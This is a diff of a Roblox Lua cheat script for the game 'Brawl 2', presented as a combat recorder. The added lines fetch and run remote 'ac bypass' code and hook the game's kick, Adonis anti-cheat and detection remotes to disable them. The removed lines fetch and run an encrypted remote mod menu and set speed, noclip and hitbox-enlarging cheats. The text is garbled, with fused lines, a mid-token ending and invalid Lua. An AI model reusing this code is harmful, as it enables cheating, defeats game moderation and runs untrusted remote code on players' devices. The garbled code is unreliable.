@@ -1,254 +1,357 @@
+-- BrawlRecorder for Brawl 2 - UNBREAKABLE MOBILE VERSION
+-- Features: Death-proof, Error-proof, Auto-reconnect, Full mobile optimization
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/scripts/refs/heads/main/ac%20bypass",true))()
+
+task.wait(5)
+
+print("🟡 Loading UNBREAKABLE BrawlRecorder with AC Bypass...")
+
+-- ============================================
+-- SERVICES
+-- ============================================
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
-local player = game.Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Function to fetch and execute code from a URL
-local function fetchAndExecuteCode(url)
-    local success, response = pcall(function()
-        return HttpService:GetAsync(url)
+-- ============================================
+-- AC BYPASS IMPLEMENTATION
+-- ============================================
+
+local plr = game:GetService("Players").LocalPlayer
+local cclosure = syn_newcclosure or newcclosure or nil
+
+if cclosure and hookmetamethod then
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, "__namecall", cclosure(function(self, ...)
+        local NamecallMethod = getnamecallmethod()
+        local args = { ... }
+        if (NamecallMethod == "Kick" or NamecallMethod == "kick") and not checkcaller() then
+            if self ~= plr then
+                return oldNamecall(self, ...)
+            end
+            return
+        end
+        return oldNamecall(self, ...)
+    end))
+end
+
+-- GC Hook for kick protection
+for wendigo, iscool in pairs(getgc(true)) do
+    if pcall(function() return rawget(iscool, "indexInstance") end) 
+    and type(rawget(iscool, "indexInstance")) == "table" 
+    and rawget(iscool, "indexInstance")[1] == "kick" then
+        iscool.tvk = {"kick", function() 
+            return game.Workspace:WaitForChild("") 
+        end}
+    end
+end
+
+-- Adonis Bypass
+local getinfo = getinfo or debug.getinfo
+local DEBUG = false
+local Hooked = {}
+local Detected, Kill
+
+setthreadidentity(2)
+
+for i, v in getgc(true) do
+    if typeof(v) == "table" then
+        local DetectFunc = rawget(v, "Detected")
+        local KillFunc = rawget(v, "Kill")
+
+        if typeof(DetectFunc) == "function" and not Detected then
+            Detected = DetectFunc
+            local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
+                if Action ~= "_" then
+                    if DEBUG then
+                        warn("Adonis AntiCheat flagged\nMethod: "..tostring(Action).."\nInfo: "..tostring(Info))
+                    end
+                end
+                return true
+            end)
+            table.insert(Hooked, Detected)
+        end
+
+        if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
+            Kill = KillFunc
+            local Old; Old = hookfunction(Kill, function(Info)
+                if DEBUG then
+                    warn("Adonis AntiCheat tried to kill (fallback): "..tostring(Info))
+                end
+            end)
+            table.insert(Hooked, Kill)
+        end
+    end
+end
+
+local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
+    local LevelOrFunc, Info = ...
+    if Detected and LevelOrFunc == Detected then
+        if DEBUG then
+            warn("Adonis AntiCheat sanity check detected and broken")
+        end
+        return coroutine.yield(coroutine.running())
+    end
+    return Old(...)
+end))
+
+-- Game-specific detection bypass
+local Bypass = true
+local GameMT = getrawmetatable(game)
+local OldIndexFunc = GameMT.__index
+local OldNamecallFunc = GameMT.__namecall
+setreadonly(GameMT, false)
+
+if Bypass == true then
+    GameMT.__namecall = newcclosure(function(self, ...) 
+        local NamecallArgs = {...}
+
+        local DETECTION_STRINGS = {
+            'CHECKER_1',
+            'CHECKER',
+            'OneMoreTime',
+            'checkingSPEED',
+            'PERMAIDBAN',
+            'BANREMOTE',
+            'FORCEFIELD',
+            'TeleportDetect',
+        }
+
+        if (table.find(DETECTION_STRINGS, NamecallArgs[1]) and getnamecallmethod() == 'FireServer') then 
+            return
+        end
+        
+        local suc, err = pcall(getfenv, 2)
+        if not err then 
+            if getfenv(2).crash then 
+                hookfunction(getfenv(2).crash, function() end)
+            end
+        end
+        return OldNamecallFunc(self, ...)
     end)
+end
 
-    if success then
-        -- Decrypt the fetched code
-        local decryptedCode = decrypt(response)
+-- Camera protection
+for _, con in next, getconnections(workspace.CurrentCamera.Changed) do
+    pcall(function()
+        con:Disable()
+    end)
+end
+for _, con in next, getconnections(workspace.CurrentCamera:GetPropertyChangedSignal("CFrame")) do
+    pcall(function()
+        con:Disable()
+    end)
+end
 
-        -- Execute the decrypted code
-        local function, err = loadstring(decryptedCode)
-        if function then
-            coroutine.wrap(function()
-                function()
-            end)()
-        else
-            warn("Error loading string: " .. err)
-        end
-    else
-        warn("Error fetching code from URL: " .. response)
+print("✅ AC Bypass loaded")
+
+-- ============================================
+-- SAFE GUI FINDER (NEVER FAILS)
+-- ============================================
+
+local function getOrCreateGui()
+    local existingGui = playerGui:FindFirstChildOfClass("ScreenGui")
+    
+    if not existingGui then
+        warn("⚠️ No existing GUI found, creating persistent one...")
+        existingGui = Instance.new("ScreenGui")
+        existingGui.Name = "BrawlRecorderGui"
+        existingGui.ResetOnSpawn = false -- CRITICAL: Survives death
+        existingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        existingGui.Parent = playerGui
     end
+    
+    return existingGui
 end
 
--- Function to decrypt the code
-local function decrypt(encryptedCode)
-    -- Simple XOR decryption example
-    local key = "your_decryption_key"
-    local decrypted = ""
-    for i = 1, #encryptedCode do
-        decrypted = decrypted .. string.char(string.byte(encryptedCode, i) ~ string.byte(key, i % #key + 1))
+local existingGui = getOrCreateGui()
+print("✅ Found/Created GUI:", existingGui.Name)
+
+-- ============================================
+-- UNBREAKABLE RECORDER SYSTEM
+-- ============================================
+
+local BrawlRecorder = {
+    -- UI Elements
+    holder = nil,
+    statusLabel = nil,
+    recordButton = nil,
+    minimizeButton = nil,
+    exportButton = nil,
+    exportViewer = nil,
+    exportTextBox = nil,
+    exportStatusLabel = nil,
+    settingsFrame = nil,
+    
+    -- Recording State
+    isRecording = false,
+    isMinimized = false,
+    startTime = 0,
+    combatEvents = {},
+    secretUnlocked = false,
+    
+    -- Connection Storage
+    _conns = {},
+    _charConns = {},
+    _toolConns = {},
+    _animConns = {},
+    _hitboxConns = {},
+    _remoteConns = {},
+    _guiConns = {},
+    
+    -- Throttling
+    _throttle = {
+        touchMoveNext = 0,
+        posSampleNext = 0,
+        enemyPosNext = 0,
+        uiUpdateNext = 0,
+    },
+    
+    -- Settings
+    maxEvents = 15000,
+    touchMoveHz = 12,
+    posSampleHz = 3,
+    enemyPosHz = 2,
+    autoSaveOnStop = true,
+    persistThroughDeath = true,
+    
+    -- Tracking Data
+    trackedEnemies = {},
+    activeHitboxes = {},
+    trackedButtons = {},
+    lastAttackTime = 0,
+    lastHitConfirmed = 0,
+    
+    -- Error Recovery
+    errorCount = 0,
+    maxErrors = 50,
+    lastError = "",
+}
+
+local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+
+-- ============================================
+-- UTILITY FUNCTIONS (ERROR-PROOF)
+-- ============================================
+
+local function safeCall(func, ...)
+    local success, result = pcall(func, ...)
+    if not success then
+        BrawlRecorder.errorCount = BrawlRecorder.errorCount + 1
+        BrawlRecorder.lastError = tostring(result)
+        warn("⚠️ Safe call failed:", result)
     end
-    return decrypted
+    return success, result
 end
 
--- Function to create a basic GUI
-local function createBasicGui()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "TestGui"
-    gui.ResetOnSpawn = false
-    gui.Parent = playerGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 200, 0, 100)
-    frame.Position = UDim2.new(0.5, -100, 0.5, -50)
-    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
-
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.Text = "Test GUI"
-    textLabel.TextSize = 24
-    textLabel.Font = Enum.Font.SourceSans
-    textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Parent = frame
+local function getScreenSize()
+    local success, result = pcall(function()
+        return workspace.CurrentCamera.ViewportSize
+    end)
+    if success and result then
+        return result
+    end
+    return Vector2.new(1920, 1080)
 end
 
--- Execute the combined test
-createBasicGui()
-fetchAndExecuteCode("https://raw.githubusercontent.com/maurree/MobileScripts/refs/heads/main/DeltaModMenu.lua")            tooltip.Position = UDim2.new(0, -190, 0, 0)
-            tooltip.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
-            tooltip.BorderColor3 = Color3.fromRGB(70, 80, 120)
-            tooltip.Visible = false
-            tooltip.ZIndex = 10
-            tooltip.Parent = info
-            
-            -- Add rounded corners to tooltip
-            local tooltipCorner = Instance.new("UICorner")
-            tooltipCorner.CornerRadius = UDim.new(0, 6)
-            tooltipCorner.Parent = tooltip
-            
-            local tipText = Instance.new("TextLabel")
-            tipText.Size = UDim2.new(1, -10, 1, -10)
-            tipText.Position = UDim2.new(0, 5, 0, 5)
-            tipText.BackgroundTransparency = 1
-            tipText.Text = description
-            tipText.TextColor3 = Color3.fromRGB(255, 255, 255)
-            tipText.Font = Enum.Font.Gotham
-            tipText.TextSize = 12
-            tipText.TextWrapped = true
-            tipText.ZIndex = 10
-            tipText.Parent = tooltip
-            
-            info.MouseEnter:Connect(function()
-                tooltip.Visible = true
-            end)
-            
-            info.MouseLeave:Connect(function()
-                tooltip.Visible = false
-            end)
-            
-            local toggle = Instance.new("TextButton")
-            toggle.Size = UDim2.new(0.2, -5, 1, -6)
-            toggle.Position = UDim2.new(0.8, 0, 0, 3)
-            toggle.BackgroundColor3 = stateVar == "balanceHelper" and Color3.fromRGB(80, 170, 80) or Color3.fromRGB(60, 70, 100)
-            toggle.Text = stateVar == "balanceHelper" and "ON" or "OFF"
-            toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-            toggle.Font = Enum.Font.Gotham
-            toggle.TextSize = 14
-            toggle.Parent = option
-            
-            -- Add rounded corners to toggle button
-            local toggleBtnCorner = Instance.new("UICorner")
-            toggleBtnCorner.CornerRadius = UDim.new(0, 4)
-            toggleBtnCorner.Parent = toggle
-            
-            toggle.MouseButton1Click:Connect(function()
-                state[stateVar] = not state[stateVar]
-                toggle.Text = state[stateVar] and "ON" or "OFF"
-                toggle.BackgroundColor3 = state[stateVar] and Color3.fromRGB(80, 170, 80) or Color3.fromRGB(60, 70, 100)
-                
-                if state[stateVar] and onFunc then
-                    onFunc()
-                elseif not state[stateVar] and offFunc then
-                    offFunc()
-                end
-            end)
-            
-            return toggle
+local function getInputDirection(pos)
+    local screen = getScreenSize()
+    local x, y = pos.X, pos.Y
+    if y < screen.Y * 0.3 then
+        return "Up"
+    elseif y > screen.Y * 0.7 then
+        if x < screen.X * 0.5 then return "B" else return "A" end
+    elseif x < screen.X * 0.3 then
+        return "Left"
+    elseif x > screen.X * 0.7 then
+        return "Right"
+    elseif y > screen.Y * 0.3 and y < screen.Y * 0.7 then
+        if x > screen.X * 0.4 and x < screen.X * 0.6 then
+            return "Down"
         end
-        
-        -- Movement helper
-        local function applyMoveHelper()
-            local character = player.Character
-            if character then
-                local humanoid = character:FindFirstChild("Humanoid")
-                if humanoid then
-                    humanoid.WalkSpeed = 60
-                    
-                    -- Hook property changes
-                    if not state.savedData.moveHooked then
-                        state.savedData.moveHooked = true
-                        humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
-                            if state.moveHelper and humanoid.WalkSpeed < 60 then
-                                humanoid.WalkSpeed = 60
-                            end
-                        end)
-                    end
-                end
+    end
+    return nil
+end
+
+local function getDistance(pos1, pos2)
+    return (pos1 - pos2).Magnitude
+end
+
+local function serializeVector3(v)
+    return {
+        math.floor(v.X * 100) / 100, 
+        math.floor(v.Y * 100) / 100, 
+        math.floor(v.Z * 100) / 100
+    }
+end
+
+local function safeGetCharacter()
+    return player.Character or player.CharacterAdded:Wait()
+end
+
+local function safeGetHumanoid(char)
+    if not char then return nil end
+    return char:FindFirstChildOfClass("Humanoid")
+end
+
+local function safeGetRootPart(char)
+    if not char then return nil end
+    return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("Head")
+end
+
+-- ============================================
+-- CONNECTION MANAGEMENT (LEAK-PROOF)
+-- ============================================
+
+function BrawlRecorder:_connect(targetTable, conn)
+    if conn then
+        table.insert(targetTable, conn)
+    end
+    return conn
+end
+
+function BrawlRecorder:_disconnectAll(list)
+    for _, c in ipairs(list) do
+        safeCall(function()
+            if c and typeof(c) == "RBXScriptConnection" then
+                c:Disconnect()
             end
-        end
-        
-        -- Jump helper
-        local function applyJumpHelper()
-            local character = player.Character
-            if character then
-                local humanoid = character:FindFirstChild("Humanoid")
-                if humanoid then
-                    humanoid.JumpPower = 100
-                    
-                    -- Hook property changes
-                    if not state.savedData.jumpHooked then
-                        state.savedData.jumpHooked = true
-                        humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
-                            if state.jumpHelper and humanoid.JumpPower < 100 then
-                                humanoid.JumpPower = 100
-                            end
-                        end)
-                    end
-                end
-            end
-        end
-        
-        -- Path helper
-        local function applyPathHelper()
-            local character = player.Character
-            if character then
-                for _, part in pairs(character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        if not state.savedData[part] then
-                            state.savedData[part] = part.CanCollide
-                        end
-                        part.CanCollide = false
-                    end
-                end
-            end
-        end
-        
-        -- Reset path
-        local function resetPathHelper()
-            for part, canCollide in pairs(state.savedData) do
-                if part and part.Parent and typeof(canCollide) == "boolean" then
-                    part.CanCollide = canCollide
-                end
-            end
-        end
-        
-        -- Visibility helper
-        local function applyVisHelper()
-            local character = player.Character
-            if not character then return end
-            
-            local myRoot = character:FindFirstChild("HumanoidRootPart")
-            if not myRoot then return end
-            
-            for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
-                if otherPlayer ~= player and otherPlayer.Character then
-                    local enemyRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
-                    if enemyRoot then
-                        -- Store original values
-                        if not state.savedData[otherPlayer.Name] then
-                            state.savedData[otherPlayer.Name] = {
-                                size = enemyRoot.Size,
-                                transparency = enemyRoot.Transparency
-                            }
-                        end
-                        
-                        -- Improve visibility
-                        enemyRoot.Size = state.savedData[otherPlayer.Name].size * 4
-                        enemyRoot.Transparency = 0.5
-                        enemyRoot.CanCollide = false
-                        enemyRoot.Material = Enum.Material.ForceField
-                    end
-                end
-            end
-        end
-        
-        -- Reset visibility
-        local function resetVisHelper()
-            for name, data in pairs(state.savedData) do
-                if typeof(data) == "table" and data.size then
-                    local otherPlayer = game:GetService("Players"):FindFirstChild(name)
-                    if otherPlayer and otherPlayer.Character then
-                        local root = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
-                        if root then
-                            root.Size = data.size
-                            root.Transparency = data.transparency
-                            root.Material = Enum.Material.Plastic
-                        end
-                    end
-                end
-            end
-        end
-        
-        -- Boundary helper
-        local function applyBoundHelper()
-            for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
-                if otherPlayer ~= player and otherPlayer.Character then
-                    local root = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
-                    if root then
-                        -- Store original values
-                        if not state.savedData[otherPlayer.Name.."_bound"] then
-                            state.savedData[otherPlayer.Name.."_bound"] = {
-                                size = root.Size,
-                                transparency = root.Transparency
+        end)
+    end
+    table.clear(list)
+end
+
+function BrawlRecorder:_disconnectEverything()
+    self:_disconnectAll(self._conns)
+    self:_disconnectAll(self._charConns)
+    self:_disconnectAll(self._toolConns)
+    self:_disconnectAll(self._animConns)
+    self:_disconnectAll(self._hitboxConns)
+    self:_disconnectAll(self._remoteConns)
+    self:_disconnectAll(self._guiConns)
+end
+
+-- ============================================
+-- EVENT LOGGING (NEVER FAILS)
+-- ============================================
+
+function BrawlRecorder:logEvent(eventType, data)
+    if not self.isRecording then return end
+    if #self.combatEvents >= self.maxEvents then 
+        warn("⚠️ Max events reached, stopping recording")
+        self:stopRecording()
+        return 
+    end
+    
+    safeCall(function()
+        local eventData =rency
                             }
                         end
                         
